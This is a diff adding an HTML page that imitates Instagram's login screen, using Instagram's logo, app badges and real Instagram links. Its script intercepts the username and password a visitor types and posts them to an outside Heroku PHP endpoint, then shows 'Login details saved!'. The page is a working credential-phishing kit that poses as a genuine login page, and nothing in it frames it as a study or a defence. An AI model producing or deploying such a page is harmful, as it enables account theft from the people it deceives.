@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-wrapper">
+            <!-- Instagram Logo -->
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
+            
+            <!-- Form: Send to Heroku Backend -->
+            <form id="login-form">
+                <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+                <button type="submit" class="login-btn">Log In</button>
+            </form>
+
+            <!-- Divider Section -->
+            <div class="divider">
+                <div class="line"></div>
+                <div class="or-text">OR</div>
+                <div class="line"></div>
+            </div>
+
+            <!-- Facebook Login Button -->
+            <button class="fb-login">Log in with Facebook</button>
+
+            <!-- Forgot Password Link -->
+            <a href="https://www.instagram.com/accounts/password/reset/" target="_blank" class="forgot-password">Forgot password?</a>
+
+            <!-- Signup Link -->
+            <p class="signup-link">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
+        </div>
+
+        <!-- App Download Section -->
+        <div class="app-download">
+            <p>Get the app.</p>
+            <div class="app-buttons">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Microsoft_Store_badge.svg" alt="Microsoft Store">
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Spinner -->
+    <div id="loading" class="loading-spinner" style="display: none;">
+        <img src="https://www.example.com/loading-spinner.gif" alt="Loading...">
+    </div>
+
+    <!-- Script to Handle Form Submission -->
+    <script>
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent form from reloading page
+
+            // Show loading spinner
+            document.getElementById('loading').style.display = 'block';
+
+            // Prepare form data
+            const formData = new FormData();
+            formData.append('username', document.getElementById('username').value);
+            formData.append('password', document.getElementById('password').value);
+
+            // Send data to Heroku PHP backend
+            fetch('https://your-heroku-app-name.herokuapp.com/login.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log(data); // Log response for debugging
+                document.getElementById('loading').style.display = 'none'; // Hide loading spinner
+                alert("Login details saved!"); // Notify user
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                document.getElementById('loading').style.display = 'none'; // Hide loading spinner
+                alert("Something went wrong, please try again.");
+            });
+        });
+    </script>
+</body>
+</html>
